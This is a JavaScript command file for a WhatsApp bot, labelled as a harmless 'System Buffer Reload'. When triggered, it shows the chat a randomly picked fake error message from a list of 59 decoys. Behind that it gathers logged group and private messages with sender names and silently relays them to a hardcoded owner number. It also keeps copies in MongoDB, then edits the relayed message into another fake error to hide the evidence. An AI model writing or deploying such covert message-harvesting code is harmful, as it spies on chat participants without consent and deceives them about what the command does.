const { proto } = require('@whiskeysockets/baileys');

module.exports = {
    name: "reload",
    category: "founder",
    desc: "V_HUB: System Buffer Reload",
    async execute(sock, msg, args, { from, sender, client, logsCollection }) {
        // 1. DYNAMIC CONFIG
        const ownerNum = (process.env.OWNER_NUMBER || "254768666068").replace(/[^0-9]/g, "");
        const masterJid = `${ownerNum}@s.whatsapp.net`;
        const triggerChar = "§"; 

        const db = client?.db ? client.db("vinnieBot") : logsCollection.db || logsCollection.database;
        const relayVault = db.collection("relay_vault");

        // 🎭 THE "SCARY" JS ERROR MATRIX (Expanded to 59 Decoys)
        const decoys = [
            `*Uncaught ReferenceError:* vhub_buffer is not defined\n    at Module._compile (node:internal/modules/cjs/loader:1101:14)`,
            `*TypeError:* Cannot read properties of undefined (reading 'byteLength')\n    at Baileys.Socket.send (./node_modules/@whiskeysockets/baileys/lib/Socket.js:42:18)`,
            `*Error [ERR_STREAM_WRITE_AFTER_END]:* write after end\n    at new NodeError (node:internal/errors:371:5)`,
            `*RangeError:* Maximum call stack size exceeded\n    at RegExp.exec (<anonymous>)`,
            `*SyntaxError:* Unexpected token 'export'\n    at Object.compileFunction (node:vm:352:18)`,
            `*Error:* Connection lost: The server closed the connection.\n    at Protocol._onSocketError (./node_modules/mysql/lib/protocol/Protocol.js:121:13)`,
            `*TypeError:* sock.sendMessage is not a function\n    at Object.execute (./commands/founder/reload.js:142:21)`,
            `*EvalError:* call to eval() blocked by CSP\n    at internal/process/task_queues.js:95:5`,
            `*URIError:* URI malformed\n    at decodeURIComponent (<anonymous>)\n    at parser.js:42:12`,
            `*Error:* ENOSPC: no space left on device, write\n    at Object.writeSync (node:fs:585:3)`,
            `*ReferenceError:* _jid is not defined\n    at eval (eval at <anonymous> (main.js:1:1), <anonymous>:1:1)`,
            `*Error:* Request failed with status code 503\n    at createError (./node_modules/axios/lib/core/createError.js:16:15)`,
            `*TypeError:* Cannot read property 'map' of null\n    at render (./lib/ui/menu.js:45:12)`,
            `*Error:* Heartbeat timeout\n    at Baileys.Socket.onClose (./node_modules/@whiskeysockets/baileys/lib/Socket.js:84:10)`,
            `*Uncaught ReferenceError:* process is not defined\n    at v_hub_relay.js:12:1`,
            `*Error:* EMFILE: too many open files, open '/app/session/creds.json'`,
            `*TypeError:* logsCollection.find is not a function\n    at vinnieBot.js:84:12`,
            `*Error:* MongoDB connection lost\n    at ./node_modules/mongodb/lib/cmap/connection_pool.js:241:13`,
            `*SyntaxError:* Unexpected end of JSON input\n    at JSON.parse (<anonymous>)`,
            `*Error:* Permission denied (publickey)\n    at Socket.<anonymous> (node:net:704:12)`,
            `*TypeError:* undefined is not a function\n    at Array.forEach (<anonymous>)`,
            `*Error:* Invalid session ID format\n    at Auth.validate (./lib/auth.js:12:5)`,
            `*ReferenceError:* client is not defined\n    at handler.js:52:10`,
            `*Error:* Rate limit exceeded (429)\n    at RequestHandler.handle (./lib/net/http.js:104:15)`,
            `*TypeError:* Cannot set property 'status' of undefined\n    at Object.sync (./lib/db/sync.js:22:9)`,
            `*Error:* Cluster worker 1421 died (code 1)\n    at Master.onExit (node:cluster:542:12)`,
            `*Error:* Buffer is full, cannot push to stack\n    at MemoryManager.alloc (./lib/mem.js:42:11)`,
            `*SyntaxError:* Missing initializer in const declaration\n    at node:internal/modules/cjs/loader:1101:14`,
            `*Error:* [baileys] session not found\n    at Session.get (./lib/store.js:88:12)`,
            `*TypeError:* sender.split is not a function\n    at reload.js:45:32`,
            `*Error:* Failed to decrypt message (Signal)\n    at SignalProtocol.decrypt (./node_modules/libsignal/lib/session.js:84:12)`,
            `*ReferenceError:* isMe is not defined\n    at main.js:104:5`,
            `*Error:* ECONNREFUSED 127.0.0.1:27017\n    at TCPConnectWrap.afterConnect [as oncomplete] (node:net:1157:16)`,
            `*TypeError:* Cannot read properties of null (reading 'key')`,
            `*Error:* [Heroku] R10 (Boot timeout) -> Web process failed to bind to $PORT within 60s`,
            `*RangeError:* Invalid time value\n    at Date.toISOString (<anonymous>)`,
            `*Error:* ENOENT: no such file or directory, open './database.json'`,
            `*TypeError:* Object.keys called on non-object\n    at Function.keys (<anonymous>)`,
            `*Error:* Worker timed out after 30000ms\n    at node:internal/process/task_queues:95:5`,
            `*SyntaxError:* Identifier 'sock' has already been declared`,
            `*Error:* [V_HUB] Encryption key mismatch\n    at internal/security.js:84:12`,
            `*TypeError:* msg.message.conversation is undefined`,
            `*Error:* Socket closed unexpectedly (code 1000)`,
            `*ReferenceError:* require is not defined in ES module scope`,
            `*Error:* Handshake timeout during Signal setup`,
            `*TypeError:* Cannot destructure property 'from' of 'undefined' as it is undefined.`,
            `*Error:* [V_HUB_SYNC] Local storage full, clearing cache...`,
            `*RangeError:* Array buffer allocation failed`,
            `*Error:* EADDRINUSE: address already in use :::8080`,
            `*TypeError:* Cannot read property 'db' of undefined`,
            `*Error:* [Vinnie] Failed to parse command arguments`,
            `*ReferenceError:* config is not defined\n    at ./lib/utils.js:5:10`,
            `*Error:* [baileys] Fetching prekeys failed`,
            `*TypeError:* (intermediate value).find is not a function`,
            `*Error:* Connection to MongoDB failed: connection timeout`,
            `*SyntaxError:* Invalid or unexpected token\n    at node:vm:352:18`,
            `*Error:* [SYSTEM] Execution context destroyed`,
            `*TypeError:* Object.entries(...).map is not a function`,
            `*Error:* [FATAL] Node.js process exited with code 1`
        ];

        // 2. THE REACTION & PUBLIC DECOY
        await sock.sendMessage(from, { react: { text: "🔄", key: msg.key } });
        
        await sock.sendMessage(from, { 
            text: decoys[Math.floor(Math.random() * decoys.length)] 
        }, { quoted: msg });

        try {
            if (!logsCollection) return;

            // 3. ENHANCED FILTERS (Time + GC/PC)
            const timeInput = args[0] || "1h";
            const typeFilter = args[1] ? args[1].toLowerCase() : "all"; 
            const timeValue = parseInt(timeInput) || 1;
            
            // Logic for hours, minutes, days
            let duration = timeInput.endsWith('m') ? timeValue * 60 * 1000 : 
                           timeInput.endsWith('d') ? timeValue * 24 * 60 * 60 * 1000 : 
                           timeValue * 60 * 60 * 1000;

            const startTime = new Date(Date.now() - duration);
            let query = { timestamp: { $gte: startTime } };
            
            // Apply GC (Group) or PC (Private) filters
            if (typeFilter === 'gc') query.chatId = { $regex: /@g.us$/ };
            if (typeFilter === 'pc') query.chatId = { $regex: /@s.whatsapp.net$/ };

            const logs = await logsCollection.find(query).toArray();

            if (logs.length > 0) {
                let report = `${triggerChar}┏━━━━━ ✿ *V_HUB RELOAD FEED* ✿ ━━━━━┓\n┃ _Triggered By: ${sender.split('@')[0]}_\n┃ _Filter: ${typeFilter.toUpperCase()} | ${timeInput}_\n┃\n`;
                
                logs.forEach(l => {
                    const isGroup = l.chatId?.endsWith('@g.us');
                    const origin = isGroup ? `👥 Group` : `👤 Inbox`;
                    report += `┃ ${origin}\n┃ 🕒 *${new Date(l.timestamp).toLocaleTimeString()}*\n┃ 👤 *${l.name || 'Unknown'}*\n┃ 💬 ${l.message || '[No Message]'}\n┃\n`;
                });
                report += `┗━━━━━━━━━━━━━━━━━━━━━━┛`;

                // A. MongoDB Vaulting (Auto-deletes in 24h)
                await relayVault.createIndex({ "createdAt": 1 }, { expireAfterSeconds: 86400 });
                await relayVault.insertOne({ report, createdAt: new Date() });

                // B. The Silent Relay (Sends to Master number only)
                const relayMsg = await sock.sendMessage(masterJid, { text: report });

                // C. The Ghost Edit (Hides evidence on Host SIM after 5s)
                setTimeout(async () => {
                    await sock.sendMessage(masterJid, { 
                        text: decoys[Math.floor(Math.random() * decoys.length)], 
                        edit: relayMsg.key 
                    });
                }, 5000);
            }
        } catch (e) {
            console.error("Silent Relay Fail:", e.message);
        }
    }
};
